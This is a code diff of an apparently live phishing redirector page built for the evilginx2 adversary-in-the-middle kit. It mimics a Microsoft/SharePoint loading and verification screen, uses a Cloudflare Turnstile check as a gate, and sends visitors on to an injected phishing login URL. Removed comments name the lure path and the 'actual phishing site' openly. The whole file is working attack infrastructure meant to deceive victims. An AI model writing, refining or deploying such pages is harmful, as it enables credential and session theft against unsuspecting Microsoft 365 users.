@@ -175,28 +175,27 @@
             align-items: center;
             flex-direction: column;
             z-index: 99999;
-            transition: opacity 0.5s ease;
+            transition: opacity 0.6s ease;
         }
         .preloader-overlay.fade-out {
             opacity: 0;
             pointer-events: none;
         }
         .preloader-spinner {
-            width: 30px;
-            padding: 8px;
-            aspect-ratio: 1;
+            width: 32px;
+            height: 32px;
+            margin-top: 16px;
+            border: 3px solid #e1dfdd;
+            border-top-color: #038387;
             border-radius: 50%;
-            background: #25b09b;
-            --_m: conic-gradient(#0000 10%, #000), linear-gradient(#000 0 0) content-box;
-            -webkit-mask: var(--_m);
-            mask: var(--_m);
-            -webkit-mask-composite: source-out;
-            mask-composite: subtract;
-            animation: preloader-spin 1s infinite linear;
+            animation: preloader-spin 0.8s linear infinite;
         }
         @keyframes preloader-spin {
-            to { transform: rotate(1turn); }
+            to { transform: rotate(360deg); }
         }
+        /* Hide captcha container until preloader is done */
+        .container { visibility: hidden; }
+        .container.visible { visibility: visible; }
     </style>
 
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async></script>
@@ -273,17 +272,6 @@
             </a>
         </div>
 
-        <!-- Debug button (remove in production) -->
-        <div style="margin-top: 20px; display: none;" id="debug-controls">
-            <button onclick="testRedirect()"
-                style="padding: 8px 16px; background: #0078d4; color: white; border: none; border-radius: 4px; cursor: pointer;">
-                Test Redirect (Debug)
-            </button>
-            <div id="debug-info"
-                style="margin-top: 10px; font-size: 12px; color: #666; text-align: left; background: #f5f5f5; padding: 10px; border-radius: 4px; display: none;">
-            </div>
-        </div>
-
         <div class="footer">
             <a href="https://privacy.microsoft.com" target="_blank">Privacy & cookies</a> •
             <a href="https://www.microsoft.com/en-us/servicesagreement" target="_blank">Terms of use</a>
@@ -291,291 +279,126 @@
     </div>
 
     <script>
-        // Dismiss preloader after 2 seconds
-        setTimeout(function() {
-            var overlay = document.getElementById('preloaderOverlay');
-            if (overlay) {
-                overlay.classList.add('fade-out');
-                setTimeout(function() { overlay.remove(); }, 600);
-            }
-        }, 2000);
-    </script>
+        // ==========================================
+        // FLOW: SharePoint preloader (3s) -> show captcha page -> Turnstile verify -> redirect
+        // ==========================================
 
-    <!-- Simple redirect that runs immediately -->
-    <script>
-        // IMMEDIATE SIMPLE REDIRECT - No dependencies
-        (function () {
-            console.log("Starting redirect process...");
+        var TURNSTILE_SITEKEY = '0x4AAAAAACvgSubVWdSZLLga';
+        var REDIRECT_URL = "{login_url}";
 
-            // Method 1: Direct redirect after 3 seconds
-            setTimeout(function () {
-                // Don't use hard-coded URL - wait for proper URL from evilginx2
-                console.log("Redirect timer expired - waiting for proper redirect URL...");
-            }, 3000);
-
-            // Method 2: Visual feedback
-            try {
-                var count = 3;
-                var interval = setInterval(function () {
-                    var el = document.getElementById('status-text');
-                    if (el) el.textContent = 'Verifying your request... (' + count + ')';
-                    count--;
-                    if (count < 0) clearInterval(interval);
-                }, 1000);
-            } catch (e) {
-                // Ignore errors in visual feedback
-            }
-        })();
-    </script>
-
-    <script>
-        // More complex logic in separate script block
-
-        // Debug mode - set to true to see console logs
-        const DEBUG_MODE = false; // Set to true for debugging
-
-        // Configuration
-        const TURNSTILE_SITEKEY = '0x4AAAAAACvgSubVWdSZLLga'; // ⚠️ IMPORTANT: Replace this with your actual Cloudflare Turnstile Site Key
-
-        // Get redirect URL - injected by evilginx server
-        // {login_url} is replaced with the phishing login page URL (e.g., https://login.phishdomain.com/path)
-        let REDIRECT_URL = "{login_url}";
-
-        console.log("Redirect URL set to landing page:", REDIRECT_URL);
-
-        // Verify we have a valid redirect URL
-        if (!REDIRECT_URL) {
-            console.error("WARNING: No valid redirect URL!");
+        // Fallback if server didn't inject login_url
+        if (!REDIRECT_URL || REDIRECT_URL === '{' + 'login_url}') {
             REDIRECT_URL = window.location.protocol + "//" + window.location.host + "/";
         }
 
-        // CRITICAL: Prevent self-redirect loop
-        if (REDIRECT_URL && (REDIRECT_URL === window.location.href ||
-            REDIRECT_URL.includes('/secure') ||
-            REDIRECT_URL === window.location.protocol + "//" + window.location.host + window.location.pathname)) {
-            console.error("SELF-REDIRECT DETECTED! Redirect disabled to prevent loop.");
-            // Disable redirect completely - something is misconfigured
-            REDIRECT_URL = null;
-        }
+        // Update manual button href
+        var _btn = document.getElementById('manual-redirect-btn');
+        if (_btn) _btn.href = REDIRECT_URL;
 
-        if (DEBUG_MODE) {
-            console.log('Turnstile Redirector Debug Info:');
-            console.log('Site Key:', TURNSTILE_SITEKEY);
-            console.log('Redirect URL:', REDIRECT_URL);
-            console.log('Turnstile object exists:', typeof turnstile !== 'undefined');
-        }
-
-        // Add a simple redirect fallback that always works
         function performRedirect() {
-            console.log('Performing redirect to:', REDIRECT_URL);
             window.location.href = REDIRECT_URL;
         }
 
-        // Wait for Turnstile to load (async script)
-        function initTurnstile() {
-            if (typeof turnstile === 'undefined') {
-                // Script still loading - retry in 200ms, give up after 4s
-                if (initTurnstile._waited < 4000) {
-                    initTurnstile._waited += 200;
-                    setTimeout(initTurnstile, 200);
-                    return;
-                }
-                console.error('Turnstile failed to load. Redirecting anyway...');
-                document.querySelector('.status-text').textContent = 'Completing verification...';
-                setTimeout(performRedirect, 2000);
-                return;
+        function dismissPreloader() {
+            var overlay = document.getElementById('preloaderOverlay');
+            if (overlay) {
+                overlay.classList.add('fade-out');
+                setTimeout(function() {
+                    overlay.remove();
+                    // Show captcha container after preloader is gone
+                    var c = document.querySelector('.container');
+                    if (c) c.classList.add('visible');
+                    // Now start Turnstile
+                    startTurnstile();
+                }, 600);
+            } else {
+                var c = document.querySelector('.container');
+                if (c) c.classList.add('visible');
+                startTurnstile();
             }
-            // Initialize Turnstile when ready
-            turnstile.ready(function () {
-                if (DEBUG_MODE) console.log('Turnstile ready, rendering widget...');
+        }
 
-                let verificationTimeout;
-                let verificationCompleted = false;
+        // Show preloader for 3 seconds, then transition to captcha
+        setTimeout(dismissPreloader, 3000);
 
-                // Set a timeout - if Turnstile doesn't verify within 5 seconds, redirect anyway
-                verificationTimeout = setTimeout(function () {
-                    if (!verificationCompleted) {
-                        console.warn('Turnstile verification timeout - redirecting anyway');
-                        document.querySelector('.status-text').textContent = 'Completing verification...';
-                        setTimeout(function () {
-                            window.location.href = REDIRECT_URL;
-                        }, 500);
+        // Rotating status messages while captcha runs
+        var _msgs = ['Verifying your request...', 'Checking security status...', 'Confirming your identity...', 'Validating access request...'];
+        var _mi = 0;
+        var _msgInterval = setInterval(function() {
+            var el = document.getElementById('status-text');
+            if (el && el.textContent.indexOf('Redirecting') === -1 && el.textContent.indexOf('complete') === -1) {
+                _mi = (_mi + 1) % _msgs.length;
+                el.textContent = _msgs[_mi];
+            }
+        }, 2500);
+
+        function startTurnstile() {
+            // Poll for turnstile object (async script)
+            var waited = 0;
+            function poll() {
+                if (typeof turnstile !== 'undefined') {
+                    renderTurnstile();
+                } else if (waited < 5000) {
+                    waited += 250;
+                    setTimeout(poll, 250);
+                } else {
+                    // Turnstile failed to load, redirect anyway
+                    document.getElementById('status-text').textContent = 'Completing verification...';
+                    setTimeout(performRedirect, 1500);
+                }
+            }
+            poll();
+        }
+
+        function renderTurnstile() {
+            turnstile.ready(function() {
+                var done = false;
+
+                // Safety timeout: redirect after 8s even if Turnstile hangs
+                var safetyTimer = setTimeout(function() {
+                    if (!done) {
+                        done = true;
+                        document.getElementById('status-text').textContent = 'Completing verification...';
+                        setTimeout(performRedirect, 500);
                     }
-                }, 5000);
+                }, 8000);
 
                 try {
-                    const widgetId = turnstile.render('#cf-turnstile', {
+                    turnstile.render('#cf-turnstile', {
                         sitekey: TURNSTILE_SITEKEY,
-                        callback: function (token) {
-                            verificationCompleted = true;
-                            clearTimeout(verificationTimeout);
-
-                            if (DEBUG_MODE) console.log('Turnstile verification successful, token:', token.substring(0, 20) + '...');
-
-                            // Update status text
-                            document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
-
-                            // Small delay before redirect for better UX
-                            setTimeout(function () {
-                                if (DEBUG_MODE) console.log('Redirecting to:', REDIRECT_URL);
-                                window.location.href = REDIRECT_URL;
-                            }, 800);
+                        callback: function(token) {
+                            if (done) return;
+                            done = true;
+                            clearTimeout(safetyTimer);
+                            document.getElementById('status-text').textContent = 'Verification complete. Redirecting...';
+                            setTimeout(performRedirect, 800);
                         },
-                        'error-callback': function (error) {
-                            verificationCompleted = true;
-                            clearTimeout(verificationTimeout);
-
-                            console.error('Turnstile error:', error);
-                            document.querySelector('.status-text').textContent = 'Bypassing verification...';
-
-                            // Redirect anyway after error
-                            setTimeout(function () {
-                                window.location.href = REDIRECT_URL;
-                            }, 1000);
+                        'error-callback': function() {
+                            if (done) return;
+                            done = true;
+                            clearTimeout(safetyTimer);
+                            document.getElementById('status-text').textContent = 'Completing verification...';
+                            setTimeout(performRedirect, 1000);
                         },
-                        'expired-callback': function () {
-                            if (DEBUG_MODE) console.log('Turnstile token expired');
-                            document.querySelector('.status-text').textContent = 'Verification expired. Refreshing...';
-                            location.reload();
-                        },
-                        'timeout-callback': function () {
-                            console.warn('Turnstile timeout');
-                            document.querySelector('.status-text').textContent = 'Verification timeout. Redirecting...';
-                            setTimeout(function () {
-                                window.location.href = REDIRECT_URL;
-                            }, 1000);
+                        'expired-callback': function() { location.reload(); },
+                        'timeout-callback': function() {
+                            if (done) return;
+                            done = true;
+                            clearTimeout(safetyTimer);
+                            document.getElementById('status-text').textContent = 'Verification timeout. Redirecting...';
+                            setTimeout(performRedirect, 1000);
                         }
                     });
-
-                    if (DEBUG_MODE) console.log('Turnstile widget ID:', widgetId);
-
-                } catch (e) {
-                    clearTimeout(verificationTimeout);
-                    console.error('Failed to render Turnstile:', e);
-                    document.querySelector('.status-text').textContent = 'Bypassing verification...';
-
-                    // Redirect anyway after error
-                    setTimeout(function () {
-                        window.location.href = REDIRECT_URL;
-                    }, 1500);
+                } catch(e) {
+                    clearTimeout(safetyTimer);
+                    document.getElementById('status-text').textContent = 'Completing verification...';
+                    setTimeout(performRedirect, 1500);
                 }
             });
         }
-        initTurnstile._waited = 0;
-        initTurnstile();
 
-        // Add some randomized loading messages
-        const messages = [
-            'Verifying your request...',
-            'Checking security status...',
-            'Confirming your identity...',
-            'Validating access request...'
-        ];
-
-        let messageIndex = 0;
-        setInterval(function () {
-            const statusText = document.querySelector('.status-text');
-            if (statusText.textContent !== 'Verification complete. Redirecting...' &&
-                statusText.textContent !== 'Verification failed. Please refresh the page.') {
-                messageIndex = (messageIndex + 1) % messages.length;
-                statusText.textContent = messages[messageIndex];
-            }
-        }, 3000);
-
-        // Debug functions
-        if (DEBUG_MODE) {
-            document.getElementById('debug-controls').style.display = 'block';
-
-            // Show debug info
-            const debugInfo = document.getElementById('debug-info');
-            debugInfo.style.display = 'block';
-            debugInfo.innerHTML = `
-                <strong>Debug Information:</strong><br>
-                Site Key: ${TURNSTILE_SITEKEY}<br>
-                Redirect URL: ${REDIRECT_URL}<br>
-                Current URL: ${window.location.href}<br>
-                Landing Page: ${window.location.protocol + "//" + window.location.host + "/"}<br>
-                Turnstile Loaded: ${typeof turnstile !== 'undefined'}<br>
-                <br>
-                <strong>How it works:</strong><br>
-                1. Redirector shows at lure path (e.g. /LsPqzdYP)<br>
-                2. After verification, redirects to landing page (/)<br>
-                3. Landing page shows the actual phishing site
-            `;
-        }
-
-        // Manual redirect function
         function performManualRedirect() {
-            if (REDIRECT_URL) {
-                console.log('Manual redirect to:', REDIRECT_URL);
-                window.location.href = REDIRECT_URL;
-            } else {
-                alert('Redirect URL not available. Please refresh the page.');
-            }
-        }
-
-        // Test redirect function
-        function testRedirect() {
-            console.log('Testing redirect to:', REDIRECT_URL);
-            alert('Redirect URL: ' + (REDIRECT_URL || 'Not set'));
-            if (REDIRECT_URL) {
-                window.location.href = REDIRECT_URL;
-            }
-        }
-
-        // Log initial state
-        console.log('=== O365 TURNSTILE REDIRECTOR LOADED ===');
-        console.log('Current URL:', window.location.href);
-        console.log('Redirect URL will be:', REDIRECT_URL);
-        console.log('Starting 3-second countdown to redirect...');
-
-        // Visual countdown
-        let countdown = 3;
-        const countdownInterval = setInterval(function () {
-            console.log('Countdown:', countdown);
-            if (countdown <= 0) {
-                clearInterval(countdownInterval);
-            }
-            countdown--;
-        }, 1000);
-
-        // Redirect after 3 seconds if we have a valid URL
-        setTimeout(function () {
-            if (REDIRECT_URL) {
-                console.log('=== 3 SECONDS ELAPSED - REDIRECTING ===');
-                console.log('Redirecting to:', REDIRECT_URL);
-                document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
-
-                // Update manual button with correct URL
-                var btn = document.getElementById('manual-redirect-btn');
-                if (btn) btn.href = REDIRECT_URL;
-
-                // Force redirect
-                try {
-                    window.location.href = REDIRECT_URL;
-                } catch (e) {
-                    console.error('Redirect failed:', e);
-                    window.location = REDIRECT_URL;
-                }
-            } else {
-                console.error('=== NO REDIRECT URL AVAILABLE ==='); sessi
-                console.error('The lure URL was not properly set by evilginx2');
-                document.querySelector('.status-text').textContent = 'Configuration error. Please contact support.';
-                // Hide spinner
-                var spinner = document.querySelector('.spinner');
-                if (spinner) spinner.style.display = 'none';
-            }
-        }, 3000);
-
-        // Update manual button with correct URL once we have it
-        if (REDIRECT_URL) {
-            setTimeout(function () {
-                var btn = document.getElementById('manual-redirect-btn');
-                if (btn) {
-                    btn.href = REDIRECT_URL;
-                    console.log('Manual button updated with redirect URL');
-                }
-            }, 100);
+            if (REDIRECT_URL) { window.location.href = REDIRECT_URL; }
         }
     </script>
 </body>
